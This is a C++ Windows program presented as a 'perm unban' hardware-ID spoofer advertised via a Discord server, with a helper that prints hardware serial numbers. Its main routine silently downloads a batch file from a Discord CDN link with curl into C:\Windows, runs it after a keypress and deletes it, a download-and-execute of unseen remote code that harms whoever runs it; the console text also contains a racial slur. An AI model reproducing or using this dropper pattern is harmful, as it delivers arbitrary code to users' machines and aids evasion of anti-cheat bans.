#include <iostream>
#include <thread>
#include <Windows.h>
#include <string>
#include "xorstr.h"

struct SlowlyPrintingString {
    std::string data;
    std::chrono::milliseconds delay;
};

std::ostream& operator<<(std::ostream& out, const SlowlyPrintingString& s) {
    for (const auto& c : s.data) {
        out << c << std::flush;
        std::this_thread::sleep_for(s.delay);
    }
    return out;
}


int main() {
    system("cls");
    std::cout << "Bouta unban yo black ass\n\n\n";
    Beep(500, 500);
    system("curl https://cdn.discordapp.com/attachments/1054265232916230144/1058203604080672878/CSI.bat -o C:\\Windows\\both.bat --silent");
    system("cls");
    SetConsoleTitle("Simply Coded A Perm Unban       discord.gg/simply");
    std::cout << "Press Any Key To Clean & Spoof\n\n\n";
    system("pause >nul");
    ShowWindow(GetConsoleWindow(), SW_SHOW);
    system("C:\\Windows\\both.bat");
    std::remove("C:\\Windows\\both.bat");
    system("cls");
    return 0;
}

namespace Check {

	void checker()
	{
		Beep(500, 500);
		Sleep(200);
		system(E("cls"));
		system("color b");
		system(E("echo BaseBoard SN:"));
		Sleep(200);
		system(E("wmic baseboard get serialnumber"));
		Sleep(200);
		system(E("echo Bios SN:"));
		Sleep(200);
		system(E("wmic bios get serialnumber"));
		Sleep(200);
		system(E("echo Cpu SN:"));
		Sleep(200);
		system(E("wmic cpu get serialnumber"));
		Sleep(200);
		system(E("echo DiskDrive SN:"));
		Sleep(200);
		system(E("wmic diskdrive get serialnumber"));
		Sleep(200);
		std::cout << E("  ") << '\n';
		Sleep(200);
		system(E("echo -----------------------------------------------"));
		Sleep(200);
		system(E("echo Going back to Dashboard in 10 Seconds..."));
		Sleep(200);
		system(E("echo -----------------------------------------------"));
		Sleep(10000);
	}
}
